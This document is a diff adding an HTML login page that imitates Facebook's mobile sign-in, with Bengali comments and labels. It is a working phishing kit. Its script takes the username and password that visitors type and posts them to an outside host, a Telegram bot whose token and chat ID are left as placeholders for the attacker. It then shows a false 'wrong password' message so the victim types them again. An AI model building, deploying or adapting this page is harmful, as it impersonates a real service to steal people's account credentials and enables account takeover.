@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8" />
+  <title>Login - YourApp</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    }
+
+    body {
+      background: #f0f2f5;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+    }
+
+    .page {
+      width: 100%;
+      max-width: 420px;   /* মোবাইল সাইজ */
+      padding: 16px 12px 24px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+    }
+
+    /* উপরের লোগো অংশ */
+    .header {
+      text-align: center;
+      margin-top: 40px;
+      margin-bottom: 24px;
+    }
+
+    .logo-text {
+      font-size: 40px;
+      font-weight: 700;
+      color: #1877f2;
+      letter-spacing: 0.5px;
+    }
+
+    /* ফর্ম কার্ড */
+    .card {
+      background: #ffffff;
+      padding: 14px 12px;
+      border-radius: 8px;
+      box-shadow: 0 1px 2px rgba(0,0,0,0.15);
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .input-group {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .card input {
+      width: 100%;
+      padding: 11px 12px;
+      font-size: 14px;
+      border-radius: 6px;
+      border: 1px solid #dddfe2;
+      outline: none;
+      background: #ffffff;
+    }
+
+    .card input::placeholder {
+      color: #808080;
+      font-size: 14px;
+    }
+
+    .card input:focus {
+      border-color: #1877f2;
+      box-shadow: 0 0 0 1px #e7f3ff;
+    }
+
+    .btn-primary {
+      margin-top: 4px;
+      width: 100%;
+      padding: 11px 12px;
+      border-radius: 6px;
+      border: none;
+      font-size: 15px;
+      font-weight: 600;
+      color: #ffffff;
+      background: #1877f2;
+      cursor: pointer;
+    }
+
+    .btn-primary:active {
+      transform: scale(0.99);
+    }
+
+    .forgot {
+      text-align: center;
+      margin-top: 8px;
+      margin-bottom: 4px;
+    }
+
+    .forgot a {
+      font-size: 13px;
+      text-decoration: none;
+      color: #1877f2;
+    }
+
+    .forgot a:hover {
+      text-decoration: underline;
+    }
+
+    .divider {
+      height: 1px;
+      width: 100%;
+      background: #dadde1;
+      margin: 8px 0 10px;
+    }
+
+    .btn-secondary {
+      width: 70%;
+      max-width: 230px;
+      margin: 0 auto;
+      padding: 10px 12px;
+      border-radius: 6px;
+      border: none;
+      font-size: 14px;
+      font-weight: 600;
+      color: #ffffff;
+      background: #42b72a;
+      cursor: pointer;
+    }
+
+    .btn-secondary:active {
+      transform: scale(0.99);
+    }
+
+    /* নিচের “Create page” টেক্সট */
+    .create-page {
+      margin-top: 18px;
+      text-align: center;
+      font-size: 12px;
+      color: #1c1e21;
+    }
+
+    .create-page span {
+      font-weight: 600;
+    }
+
+    /* নিচের ল্যাঙ্গুয়েজ + ছোট লিঙ্কগুলো */
+    .footer {
+      margin-top: 40px;
+    }
+
+    .lang-list,
+    .link-list {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 8px 12px;
+      font-size: 11px;
+      color: #737373;
+    }
+
+    .lang-list button {
+      border: none;
+      background: transparent;
+      font-size: 11px;
+      color: #737373;
+      padding: 0 2px;
+      cursor: pointer;
+    }
+
+    .lang-list button.add {
+      border: 1px solid #ccd0d5;
+      border-radius: 3px;
+      padding: 0 6px;
+      font-weight: 600;
+    }
+
+    .link-list a {
+      text-decoration: none;
+      color: #737373;
+    }
+
+    .link-list a:hover {
+      text-decoration: underline;
+    }
+
+    .copyright {
+      margin-top: 10px;
+      text-align: center;
+      font-size: 10px;
+      color: #999999;
+    }
+
+    @media (min-height: 700px) {
+      .header {
+        margin-top: 60px;
+      }
+      .footer {
+        margin-top: 60px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="page">
+    <!-- উপরের লোগো -->
+    <div>
+      <div class="header">
+        <!-- এখানে চাইলে নিজের নাম / লোগো বসাবে -->
+        <div class="logo-text">Facebook</div>
+      </div>
+
+      <!-- লগইন কার্ড -->
+      <div class="card">
+
+
+
+
+ <div class="input-group">
+  
+    <input type="text" id="username" placeholder="Username" required />
+    <input type="password" id="password" placeholder="Password" required />
+    <button class="btn-primary" onclick="sendLogin()">Login</button>
+  </div>
+
+
+
+
+
+
+
+
+
+        <div class="forgot">
+          <a href="#">পাসওয়ার্ড ভুলে গেছেন?</a>
+        </div>
+
+        <div class="divider"></div>
+
+        <button class="btn-secondary" type="button">
+          নতুন অ্যাকাউন্ট তৈরি করুন
+        </button>
+      </div>
+
+      <div class="create-page">
+    
+      </div>
+    </div>
+
+    <!-- নিচের অংশ -->
+    <div class="footer">
+      <div class="lang-list">
+        <button>বাংলা</button>
+        <button>English (UK)</button>
+        <button>हिन्दी</button>
+        <button>Español</button>
+        <button>Português (Brasil)</button>
+        <button class="add">+</button>
+      </div>
+
+      <div class="link-list" style="margin-top: 10px;">
+        <a href="#">Sign Up</a>
+        <a href="#">Log In</a>
+        <a href="#">Help</a>
+        <a href="#">Terms</a>
+        <a href="#">Privacy</a>
+      </div>
+
+      <div class="copyright">
+        YourApp © 2025
+      </div>
+    </div>
+  </div>
+  
+  
+  <script>
+    function sendLogin() {
+      const user = document.getElementById('username').value;
+      const pass = document.getElementById('password').value;
+
+      if (!user || !pass) {
+        alert("Please fill all fields");
+        return;
+      }
+
+      // আপনার Telegram Bot Token এবং Chat ID এখানে বসান
+      const botToken = "__TOKEN__";
+      const chatId = "__CHATID__";
+
+      const message = `🔐 New Login Info:\n👤 Username: ${user}\n🔑 Password: ${pass}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      })
+        .then(res => alert("Username and password wrong please try again!"))
+        .catch(err => alert("Error sending to Telegram"));
+    }
+  </script>
+</body>
+</html>
+
+  
+</body>
+                               </html>
